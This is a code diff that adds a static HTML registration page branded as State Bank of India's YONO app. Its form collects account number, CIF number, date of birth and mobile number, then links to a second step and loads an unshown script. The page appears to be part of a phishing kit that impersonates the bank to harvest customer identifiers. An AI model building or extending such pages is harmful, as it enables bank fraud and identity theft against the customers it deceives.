@@ -1,0 +1,19 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Step 1 - Registration</title><link rel="stylesheet" href="styles.css"></head>
+<body>
+<div class="container"><div class="card">
+  <div class="logo"></div>
+  <h2>YONO APP</h2> 
+  <p class="lead">STATE BANK OF INDIA</p>
+  <form class="form" data-action="new-user-step2.html" data-page="new-user-step1">
+    <input class="input" name="account_number" id="account_number" maxlength="11" inputmode="numeric" placeholder="Account Number" required>
+    <input class="input" name="cif_number" id="cif_number" maxlength="11" inputmode="numeric" placeholder="CIF Number" required>
+    <input class="input" name="dob" id="dob" data-dob placeholder="Date of Birth (DD/MM/YYYY)" required>
+    <input class="input" name="mobile" id="mobile" maxlength="10" inputmode="numeric" placeholder="Mobile Number (10 digits)" required>
+    <button class="btn" type="submit">Continue</button>
+  </form>
+</div></div>
+<script type="module" src="script.js"></script>
+</body>
+</html>
